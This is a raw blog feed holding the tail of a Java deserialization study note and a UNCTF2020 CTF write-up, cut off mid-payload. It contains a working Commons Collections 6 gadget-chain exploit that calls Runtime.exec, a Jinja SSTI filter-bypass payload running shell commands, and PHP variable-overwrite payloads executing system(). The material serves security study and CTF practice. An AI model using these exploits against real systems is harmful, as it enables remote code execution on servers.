Class clazz = Class.forName(<span class="string">"javax.management.BadAttributeValueExpException"</span>);</span><br><span class="line">        Field field = clazz.getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//序列化数据写入文件</span></span><br><span class="line">            ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obout.writeObject(badAttributeValueExpException);</span><br><span class="line">            <span class="comment">//从文件中读取并反序列化数据</span></span><br><span class="line">            ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obin.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h2><p>影响版本：</p><ul><li>Commons Collections 3.1</li></ul><p>测试环境：</p><ul><li>JDK 1.7</li><li>Commons Collections 3.1</li></ul><h3 id="利用链-6"><a href="#利用链-6" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span><span class="selector-class">.io</span><span class="selector-class">.ObjectInputStream</span><span class="selector-class">.readObject</span>()</span><br><span class="line">            <span class="selector-tag">java</span><span class="selector-class">.util</span><span class="selector-class">.HashSet</span><span class="selector-class">.readObject</span>()</span><br><span class="line">                <span class="selector-tag">java</span><span class="selector-class">.util</span><span class="selector-class">.HashMap</span><span class="selector-class">.put</span>()</span><br><span class="line">                <span class="selector-tag">java</span><span class="selector-class">.util</span><span class="selector-class">.HashMap</span><span class="selector-class">.hash</span>()</span><br><span class="line">                    <span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry</span><span class="selector-class">.hashCode</span>()</span><br><span class="line">                    <span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.keyvalue</span><span class="selector-class">.TiedMapEntry</span><span class="selector-class">.getValue</span>()</span><br><span class="line">                        <span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.map</span><span class="selector-class">.LazyMap</span><span class="selector-class">.get</span>()</span><br><span class="line">                            <span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.functors</span><span class="selector-class">.ChainedTransformer</span><span class="selector-class">.transform</span>()</span><br><span class="line">                            ...</span><br><span class="line">                            <span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.commons</span><span class="selector-class">.collections</span><span class="selector-class">.functors</span><span class="selector-class">.InvokerTransformer</span><span class="selector-class">.transform</span>()</span><br><span class="line">                            <span class="selector-tag">java</span><span class="selector-class">.lang</span><span class="selector-class">.reflect</span><span class="selector-class">.Method</span><span class="selector-class">.invoke</span>()</span><br><span class="line">                                <span class="selector-tag">java</span><span class="selector-class">.lang</span><span class="selector-class">.Runtime</span><span class="selector-class">.exec</span>()</span><br></pre></td></tr></table></figure><h3 id="利用链分析-6"><a href="#利用链分析-6" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>用了cc1的后半部分，这里对TiedMapEntry类的getValue的调用用的是TiedMapEntry的hashCode</p><p><img src="/2021/04/13/Java_04/20210413163234.png" alt="image-20210413163233085"></p><p>调用hashCode的是HashMap类的hash方法，但是k不控，需要找一个地方调用hash函数且传入参数k可控</p><p><img src="/2021/04/13/Java_04/20210413163421.png" alt="image-20210413163420815"></p><p>put可以可控调用，但是同样key的值不可控</p><p><img src="/2021/04/13/Java_04/20210413163536.png" alt="image-20210413163535346"></p><p>最后是在HashSet的readObject这里，可控调用put函数</p><p><img src="/2021/04/13/Java_04/20210413163643.png" alt="image-20210413163642651"></p><p>e值在writeObject的keySet函数生成，那么只要控制其返回值就可以了</p><p><img src="/2021/04/13/Java_04/20210413163739.png" alt="image-20210413163738637"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc6</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        new Class[] &#123; String.class &#125;, new Object[]&#123;"open  /System/Applications/Calculator.app"&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">"java.util.HashSet"</span>).getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">"java.util.HashMap"</span>).getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc6"</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc6"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Commons-Collections-7"><a href="#Commons-Collections-7" class="headerlink" title="Commons Collections 7"></a>Commons Collections 7</h2><p>影响版本：</p><ul><li>Commons Collections 3.1</li></ul><p>测试环境：</p><ul><li>JDK 1.7</li><li>Commons Collections 3.1</li></ul><p>后半段同样是cc1</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要是transform的方法调用，利用过程主要分成三段：</p><ul><li>readObject触发</li><li>调用transform方法</li><li>触发后续链达到rce的目的</li></ul><h2 id="版本相关"><a href="#版本相关" class="headerlink" title="版本相关"></a>版本相关</h2><ul><li>1、3、5、6、7是Commons Collections&lt;=3.2.1中存在的反序列化链。</li><li>2、4是Commons Collections 4.0以上中存在的反序列化链。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://paper.seebug.org/1242/" target="_blank" rel="noopener">https://paper.seebug.org/1242/</a></li><li><a href="https://xz.aliyun.com/t/7157" target="_blank" rel="noopener">https://xz.aliyun.com/t/7157</a></li><li><a href="https://www.redhatzone.com/ask/article/1505.html" target="_blank" rel="noopener">https://www.redhatzone.com/ask/article/1505.html</a></li><li><a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial/payloads</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;大部分参照&lt;strong&gt;p1g3@D0g3&lt;/strong&gt;师傅的文章，先入概念太重了，就当放个笔记吧&lt;/p&gt;
&lt;h2 id=&quot;URLDNS&quot;&gt;&lt;a href=&quot;#URLDNS&quot; class=&quot;headerlink&quot; title=&quot;URLDNS&quot;&gt;&lt;/a&gt;URLDNS&lt;/h2&gt;&lt;p&gt;&lt;code&gt;URLDNS&lt;/code&gt; 完全使用Java内置的类构造，无需第三方库支持。不能执行命令，通常用来验证目标是否存在反序列化漏洞。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只依赖原生类&lt;/li&gt;
&lt;li&gt;不限制jdk版本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;测试环境：jdk 11u8&lt;/p&gt;
&lt;h3 id=&quot;利用链&quot;&gt;&lt;a href=&quot;#利用链&quot; class=&quot;headerlink&quot; title=&quot;利用链&quot;&gt;&lt;/a&gt;利用链&lt;/h3&gt;&lt;figure class=&quot;highlight reasonml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;HashMap&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;read&lt;span class=&quot;constructor&quot;&gt;Object()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;HashMap&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;hash&lt;span class=&quot;literal&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;URL&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;hash&lt;span class=&quot;constructor&quot;&gt;Code()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;URLStreamHandler&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;hash&lt;span class=&quot;constructor&quot;&gt;Code()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;module-access&quot;&gt;&lt;span class=&quot;module&quot;&gt;&lt;span class=&quot;identifier&quot;&gt;URLStreamHandler&lt;/span&gt;.&lt;/span&gt;&lt;/span&gt;get&lt;span class=&quot;constructor&quot;&gt;HostAddress()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="反序列化" scheme="https://jlkl.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2020 WriteUp</title>
    <link href="https://jlkl.github.io/2020/11/19/Web_17/"/>
    <id>https://jlkl.github.io/2020/11/19/Web_17/</id>
    <published>2020-11-19T02:07:56.000Z</published>
    <updated>2020-11-19T02:14:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/unctf\.com/'</span>,$url))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;</span><br><span class="line">        $url=file_get_contents($url);</span><br><span class="line">        <span class="keyword">echo</span>($url);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'error!!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>url里只要包含 <code>unctf.com</code> 即可，开始想多了，弄到 gopher 协议了，然后发现 <code>dict</code> 和 <code>gopher</code> 协议根本没开启，手慢错失三血</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>e035ba36-<span class="number">6</span>bf8-<span class="number">44</span>c8-<span class="number">9837</span>-<span class="number">2</span>afecc32ca08.node3.hackingfor.fun<span class="regexp">/?url=/u</span>nctf.com<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/flag</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h3><p><strong>知识点</strong></p><ul><li>SSTI</li><li>bypass <code>__</code></li></ul><p>注册 admin 然后登陆，发现路径 <code>secret_route_you_do_not_know</code>，<code>guss</code> 参数 SSTI</p><p><code>__</code> 被过滤，网上找了下，发现这篇文章：</p><p><a href="https://www.secpulse.com/archives/115367.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/115367.html</a></p><p>payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?guess=&#123;&#123;()|attr(request.args.<span class="keyword">x</span><span class="number">1</span>)|attr(request.args.<span class="keyword">x</span><span class="number">2</span>)|attr(request.args.<span class="keyword">x</span><span class="number">3</span>)()|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(<span class="number">91</span>)|attr(request.args.<span class="keyword">x</span><span class="number">5</span>)|attr(request.args.<span class="keyword">x</span><span class="number">6</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">7</span>)|attr(request.args.<span class="keyword">x</span><span class="number">4</span>)(request.args.<span class="keyword">x</span><span class="number">8</span>)(request.args.<span class="keyword">x</span><span class="number">9</span>)&#125;&#125;&amp;<span class="keyword">x</span><span class="number">1</span>=__class__&amp;<span class="keyword">x</span><span class="number">2</span>=__base__&amp;<span class="keyword">x</span><span class="number">3</span>=__subclasses__&amp;<span class="keyword">x</span><span class="number">4</span>=__getitem__&amp;<span class="keyword">x</span><span class="number">5</span>=__init__&amp;<span class="keyword">x</span><span class="number">6</span>=__globals__&amp;<span class="keyword">x</span><span class="number">7</span>=__builtins__&amp;<span class="keyword">x</span><span class="number">8</span>=eval&amp;<span class="keyword">x</span><span class="number">9</span>=__import__('platform').popen('cat flag.txt').read()</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p><strong>知识点</strong></p><ul><li>变量覆盖</li><li>0e 开头 sha1 爆破</li><li>PHP 复杂变量</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$adminPassword = <span class="string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'fuxkSQL'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fuxkSQL</span><span class="params">($iText)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $oText = $iText;</span><br><span class="line">        $oText = str_replace(<span class="string">'\\\\'</span>, <span class="string">'\\'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">'\"'</span>, <span class="string">'"'</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"\'"</span>, <span class="string">"'"</span>, $oText);</span><br><span class="line">        $oText = str_replace(<span class="string">"'"</span>, <span class="string">"''"</span>, $oText);</span><br><span class="line">        <span class="keyword">return</span> $oText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'getVars'</span>)) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getVars</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $totals = array_merge($_GET, $_POST);</span><br><span class="line">        <span class="keyword">if</span> (count($_GET)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">                <span class="keyword">global</span> $&#123;$key&#125;;</span><br><span class="line">                <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">                    $temp_array = <span class="keyword">array</span>();</span><br><span class="line">                    <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $key2 =&gt; $value2) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                            $temp_array[$key2] = fuxkSQL(trim($value2));</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            $temp_array[$key2] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value2))));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $&#123;$key&#125; = $_GET[$key] = $temp_array;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (function_exists(<span class="string">'mysql_real_escape_string'</span>)) &#123;</span><br><span class="line">                        $&#123;$key&#125; = fuxkSQL(trim($value));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>, str_replace(<span class="string">"'"</span>, <span class="string">"\'"</span>, (trim($value))));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getVars();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($source)) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//只有admin才能设置环境变量</span></span><br><span class="line"><span class="keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you can set config variables!!'</span> . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="number">12</span>) &#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="string">"\$$key"</span> . <span class="string">'="'</span> . $GLOBALS[$key] . <span class="string">'";'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (array_keys($GLOBALS) <span class="keyword">as</span> $key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> ($GLOBALS[$key]) . <span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getVars</code> 函数逻辑使用 <code>$$var</code> 可变量覆盖，<code>md5($password) === $adminPassword</code> 值需要覆盖 <code>adminPassword</code> 值为任意已知原文的md5值即可。<code>sha1($verif) == $verif</code> 这一步采用 <code>0e</code> 相等的方式，附上爆破脚本，爆破了大概半小时……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;;$i++)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"0e&#123;$i&#125;"</span>==sha1(<span class="string">"0e&#123;$i&#125;"</span>))</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"[+] found! 0e&#123;$i&#125;"</span>); </span><br><span class="line">    <span class="keyword">elseif</span> ($i % <span class="number">1000000</span> === <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[+] current value: &#123;$i&#125;\n"</span>;</span><br></pre></td></tr></table></figure><p>payload，然后直接在 phpinfo 页面可以看到 flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">password</span>=123456&amp;verif=0e1290633704&amp;adminPassword=e10adc3949ba59abbe56e057f20f883e&amp;var1=$&#123;<span class="variable">$a</span>()&#125;&amp;<span class="attribute">a</span>=phpinfo</span><br></pre></td></tr></table></figure><p>上面这个 payload 命令命令执行的话，因为位数限制，执行的命令有限制，这题还可以任意命令执行</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">password</span>=123456&amp;verif=0e1290633704&amp;adminPassword=e10adc3949ba59abbe56e057f20f883e&amp;var1=$&#123;<span class="variable">$a</span>(<span class="variable">$b</span>)&#125;&amp;<span class="attribute">a</span>=system&amp;b=whoami</span><br></pre></td></tr></table></figure><p>非预期：</p><p>动态函数，刚好 flag 也可以在 phpinfo 看到</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password=<span class="number">123456</span><span class="variable">&amp;verif</span>=<span class="number">0e1290633704</span><span class="variable">&amp;</span>adminPassword=e10adc3949ba59abbe56e057f20f883e<span class="variable">&amp;var1</span>=\<span 